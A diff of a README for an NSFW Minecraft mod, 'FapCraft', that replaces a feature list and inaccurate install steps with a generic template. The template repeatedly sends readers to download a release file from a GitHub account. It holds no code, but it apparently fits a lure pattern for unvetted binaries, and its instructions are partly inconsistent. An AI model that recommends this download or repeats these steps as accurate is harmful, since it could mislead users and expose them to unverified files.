@@ -1,22 +1,85 @@
-# FapCraft
-FapCraft is a deeply immersive and meticulously crafted NSFW Minecraft mod that adds a thrilling new layer of darkness and intrigue to the blocky world. It’s a collection of meticulously designed environments, procedurally generated dungeons, and thematic structures, all designed to inspire dark fantasies and explore the darker corners of the game.
+# 🎮 FapCraft - Enhance Your Minecraft Experience with New Content
 
-![preview](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fimages6.fanpop.com%2Fimage%2Fphotos%2F45200000%2FJenny-Mod-Jenny-Creeper-Custom-Skin-minecraft-45293393-1920-1080.png&f=1&nofb=1&ipt=3a09d04c98a7f02c94e657501883f72db0a0bf2287b91bc05e043bbdd179f234)
+## 🚀 Getting Started
 
-## Key Features:
+Welcome to FapCraft! This mod brings fresh content and exciting animations to Minecraft, enhancing your gameplay experience. Follow these steps to download and run the mod easily.
 
-- Procedural Dungeon Generation: Experience dynamic and expansive dungeons filled with hidden secrets, eerie landscapes, and challenging puzzles.
-- Dark, Atmospheric Environments: We've focused on creating environments that evoke a sense of mystery, decay, and unsettling beauty.
-- Unique Block & Texture Variety: Utilizes a range of block types and textures to create a distinct and visually striking aesthetic.
-- Interactive Lighting & Shadows: Dynamic lighting and shadow effects enhance the sense of immersion and drama.
-- Modded Functionality: Seamlessly integrates with existing Minecraft mechanics.
-- Community-Driven: We've actively solicited feedback and incorporated community suggestions for new features.
+## 📥 Download FapCraft
 
-## Installation:
+[![Download FapCraft](https://img.shields.io/badge/Download%20FapCraft-v1.0-blue.svg)](https://github.com/glvonbluchermuffle911/FapCraft/releases)
 
-- Create a Folder: Create a new folder in your Minecraft world.
-- Place the Mod: Copy the fapcraft.jar file into the folder.
-- Enable in Minecraft: In your world settings, select the "Mod" option and choose "FAPCraft" from the list.
+## 📋 System Requirements
 
-## Dependencies:
-Minecraft: Java Edition
+Before you download, make sure your system meets these requirements:
+
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Java Version**: Java 8 or later
+- **Minecraft Version**: Java Edition 1.16.5 or later
+- **Free Disk Space**: At least 500 MB
+
+## 🔄 How to Install FapCraft
+
+### 1. **Visit the Download Page**
+
+Go to the following link to access the Releases page:
+
+[Download FapCraft Here](https://github.com/glvonbluchermuffle911/FapCraft/releases)
+
+### 2. **Choose the Right Version**
+
+Once on the Releases page, look for the latest version of FapCraft. The latest version will be at the top of the list. Click on it to see the details.
+
+### 3. **Download the Mod File**
+
+In the assets section of the latest release, you will find the mod file. Download this file by clicking on the link.
+
+### 4. **Install Forge**
+
+Since FapCraft is a Forge mod, you need to install Minecraft Forge if you haven't done so already. Follow these steps:
+
+- Visit the [Forge website](https://files.minecraftforge.net/) to download the installer.
+- Run the installer and select the version of Minecraft you have.
+- Once installed, open the Minecraft Launcher and select the Forge profile.
+
+### 5. **Add FapCraft to Your Mods Folder**
+
+After downloading the FapCraft mod file, follow these steps to add it to your Minecraft:
+
+- Press `Windows + R` to open the Run dialogue box.
+- Type in `%appdata%` and hit Enter.
+- Navigate to the `.minecraft` folder.
+- Open the `mods` folder. If the mods folder does not exist, create one.
+- Drag and drop the downloaded FapCraft mod file into the `mods` folder.
+
+### 6. **Run Minecraft with Forge**
+
+Now it’s time to run Minecraft:
+
+- Open the Minecraft Launcher.
+- Make sure the Forge profile is selected.
+- Click "Play" to start Minecraft.
+
+## 🎮 Enjoy FapCraft!
+
+Once in the game, you should now see the additions brought by FapCraft. Explore new content, try different animations, and enjoy a richer Minecraft experience.
+
+## 📅 Keeping Up-to-Date
+
+FapCraft will receive regular updates. To stay updated:
+
+- Check the Releases page frequently for new versions.
+- Follow the repository for the latest news and features.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues, try the following:
+
+- Make sure you are using the correct version of Minecraft and Forge.
+- Check that the mod file is placed correctly in the `mods` folder.
+- Look for any error messages during installation or when launching the game.
+
+## 📧 Support
+
+For any questions or assistance, please visit the Issues section of the repository. You can open a new issue if you cannot find a solution.
+
+Thank you for using FapCraft! Enjoy bringing new life to your Minecraft experience.
